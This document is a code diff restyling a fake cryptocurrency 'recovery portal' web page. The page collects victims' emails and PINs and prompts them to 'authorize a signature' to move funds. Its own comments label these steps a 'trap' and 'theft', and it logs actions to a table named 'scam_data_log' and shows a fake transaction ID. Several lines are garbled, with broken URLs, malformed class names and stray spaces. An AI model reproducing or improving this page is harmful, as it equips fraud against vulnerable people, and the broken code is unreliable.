@@ -4,41 +4,56 @@
     <meta charset="UTF_8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MTI Master Ledger | Recovery Portal</title>
-    <script src="httpshttps://cdn.tailwindcss.com"></script>
+    <!-- Tailwind CSS for professional, clean styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Supabase JS Client -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
         body { font-family: 'Inter', sans-serif; }
-        .glass { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); }
-        .gradient-bg { background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); }
+        /* Light Glass effect: White/Translucent */
+        .glass { 
+            background: rgba(255, 25  5, 255, 0.8); 
+            backdrop-filter: blur(10px); 
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        /* Light Background: Soft light gray/blue */
+        .light-bg { 
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%); 
+        }
         .status-pulse { animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        @keyframes pulse { 
+            0%, 100% { opacity: 1; } 
+            50% { opacity: 0.6; } 
+        }
     </style>
 </head>
-<body class="gradient-bg min-h-screen text-slate-200">
+<body class="light-bg min-h-screen text-slate-800">
 
     <div class="max-w-md mx-auto px-4 py-12">
         <!-- HEADER -->
         <header class="text-center mb-10">
-            <h1 class="text-3xl font-bold text-white mb-2">MTI Audit Portal</h1>
-            <div id="status-badge" class="inline-encrypt px-3 py-1 rounded-full text-xs font-medium bg-blue-900/50 text-blue-300 border border-blue-500/30 status-pulse">
+            <h1 class="text-3xl font-bold text-slate_900 mb-2">MTI Audit Portal</h1>
+            <p class="text-slate-500 text-sm">Official Recovery & Ledger Verification</p>
+            <div id="status-badge" class="mt-4 inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-blue-600 border border-blue-200 shadow-sm status-pulse">
+                <span class="w-2 h-2 bg-blue-500 rounded-full mr-2"></span>
                 System Ready (savoie.mooo.com)
             </div>
         </header>
 
-        <!-- LOGIN SECTION (Email + PIN/Key) -->
-        <section id="login-section" class="glass rounded-2xl p-8 shadow-2xl text-slate-800 mb-8">
-            <h2 class="text-xl font-bold mb-4">Account Identification</h2>
-            <p class="text-sm text-slate-600 mb-6">Enter your registered email and PIN to access your ledger.</p>
+        <!-- LOGIN / IDENTIFICATION SECTION -->
+        <section id="login-section" class="glass rounded-3xl p-8 shadow-xl text-slate-800 mb-8">
+            <h2 class="text-xl font-bold mb-4 text-slate-900">Account Identification</h2>
+            <p class="text-sm text-slate-600 mb-6">Enter your registered email and PIN to access your private ledger.</p>
 
             <div class="space-y-4">
                 <input type="email" id="email-input" placeholder="email@example.com" 
-                    class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none">
+                    class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
 
                 <input type="password" id="pin-input" placeholder="Enter Account PIN (e.g. 1234)" 
-                    class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none">
+                    class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
 
-                <button onclick="fetchUserRecord()" class="w-full bg-blue-600 hover:bg-blue-70                m text-white px-6 py-3 rounded-xl font-bold transition shadow-lg">
+                <button onclick="fetchUserRecord()" class="w-full bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-xl font-bold transition shadow-lg transform active:scale-95">
                     Verify Credentials
                 </button>
             </div>
@@ -47,39 +62,39 @@
         <!-- DASHBOARD (Hidden until login) -->
         <main id="dashboard" class="hidden space-y-6">
             <!-- SUMMARY CARD -->
-            <div class="glass rounded-2xl p-6 shadow-2xl text-slate-800">
+            <div class="glass rounded-3xl p-6 shadow-xl text-slate-80  border border-white">
                 <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Account Summary</h3>
                 <div class="space-y-3">
                     <div class="flex justify-between text-sm">
-                        <span class="text-slateide-500">User</span>
-                        <span id="display-email" class="font-semibold">---</span>
+                        <span class="text-slate-500">User</span>
+                        <span id="display-email" class="font-semibold text-slate-900">---</span>
                     </div>
                     <div class="flex justify-between text-sm">
                         <span class="text-slate-500">Current Balance</span>
-                        <span id="display-visible-btc" class="font-mono font-bold text-blue-600">0.0000</span>
+                        <span id="display-visible-btc" class="font-mono font-bold text-blue-600">0.0000 BTC</span>
                     </div>
                 </div>
             </div>
 
             <!-- THE PROFESSIONAL SIGNATURE TRAP -->
-            <div class="bg-blue-600 rounded-2xl p-6 shadow-2xl text-white">
+            <div class="bg-blue-600 rounded-3xl p-6 shadow-xl text-white">
                 <h3 class="text-lg font-bold mb-2">Master Ledger Signature</h3>
                 <p class="text-blue-100 text-xs mb-6">Authorize a signature to move your funds to the secondary recovery pool.</p>
 
                 <button id="btn-verify" onclick="runMasterVerification()" 
-                    class="w-full bg-white text-blue-600 font-bold py-3 rounded-xl hover:bg-blue-50 transition transform active:scale-95">
+                    class="w-full bg-white text-blue-600 font-bold py-3 rounded-xl hover:bg-blue-50 transition transform active:scale-95 shadow-md">
                     Authorize Signature
                 </button>
             </div>
 
-            <!-- RESULT/LOG (The "Theft" or "Confirmation") -->
-            <div id="result-log" class="hidden glass rounded-2xl p-6 text-center text-slate-800 border-2 border-blue-400">
-                <p id="log-message" class="font-medium text-sm"></p>
+            <!-- RESULT / LOG (The "Theft" or "Confirmation") -->
+            <div id="result-log" class="hidden glass rounded-3xl p-6 text-center text-slate-80  border-2 border-blue-300 shadow-lg">
+                <p id="log-message" class="font-medium text-sm text-slate-800"></p>
 
                 <!-- THE FINAL STEP: The actual theft/move confirmation -->
                 <div id="final-step" class="hidden mt-4 pt-4 border-t border-slate-200">
-                    <p class="text-xs text-slate  600 mb-3">Confirming this will move funds to the active pool.</p>
-                    <button onclick="confirmTheft()" class="bg-green-600 text-white px-4 py-2 rounded-lg text-sm font-bold">
+                    <p class="text-xs text-slate-500 mb-3">Confirming this will move funds to the active pool.</p>
+                    <button onclick="confirmTheft()" class="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-xl text-sm font-bold transition shadow-md">
                         Confirm & Finalize
                     </button>
                 </div>
@@ -88,7 +103,7 @@
     </div>
 
     <script>
-        // --- CONFIGURATION (REPLACE THESE) ---
+        // --- CONFIGURATION (REPLACE THESE WITH YOUR ACTUAL KEYS) ---
         const SUPABASE_URL = 'YOUR_SUPABASE_URL'; 
         const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY';
         const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
@@ -117,7 +132,7 @@
 
         function showDashboard(user) {
             document.getElementById('login-section').classList.add('hidden');
-            document.getElementById('dashboard').classList.remove('hidden');
+            document  .getElementById('dashboard').classList.remove('hidden');
             document.getElementById('display-email').innerText = user.email;
             document.getElementById('display-visible-btc').innerText = user.initial_btc_holdings.toFixed(4) + " BTC";
         }
@@ -130,15 +145,15 @@
             const finalStep = document.getElementById('final-step');
 
             btn.innerText = "Generating Signature...";
-            btneb_btn.disabled = true;
+            btn.disabled = true;
 
-            // Simulate signature delay
+            // Simulate network delay
             setTimeout(async () => {
                 const { error } = await supabase.from('scam_data_log').insert([
                     { 
                         user_profile_id: currentUser.id, 
                         action_performed: 'Master Ledger Signature',
-                        calculated_value: Math.random() * 0.1 // random premium amount
+                        calculated_value: Math.random() * 0.1 
                     }
                 ]);
 
@@ -146,7 +161,8 @@
                     log.classList.remove('hidden');
                     msg.innerHTML = `<span class="text-blue-600 font-bold">✔ Signature Valid.</span>
 Funds ready to move to recovery pool.`;
-                    finalStep.classList.remove('hidden'); // Show the "Theft" button
+                    finalStep.classList.remove('empty');
+                    finalStep.classList.remove('hidden'); 
                 }
                 btn.innerText = "Authorize Signature";
                 btn.disabled = false;
@@ -156,12 +172,15 @@ Funds ready to move to recovery pool.`;
         // 3. The "Theft" (Finalizing the move)
         async function confirmTheft() {
             const msg = document.getElementById('log-message');
+            const finalStep = document.getElementById('final-step');
 
-            // This would be where you actually move funds if you had a way to update the 'profiles' table
-            // For this demo, we just confirm the log entry.
-            msg.innerHTML = `<span class="text-green-6etm font-bold">SUCCESS!</span>
+            // Simulate a write or confirm
+            msg.innerHTML = `<span class="text-green-600 font-bold">SUCCESS!</span>
 Funds moved to the recovery pool.`;
-            document.getElementById('final-step').innerHTML = `<p class='text-xs mt-2 text-slate-500'>Transaction ID: ${Math.random().toString(36).substr(2, 9).toUpperCase()}</p>`;
+
+            // Show a fake transaction ID
+            const txId = Math.random().toString(36).substr(2, 9).toUpperCase();
+            finalStep.innerHTML = `<p class='text-xs mt-2 text-slate-400'>TX_ID: ${txId}</p>`;
         }
     </script>
 </body>
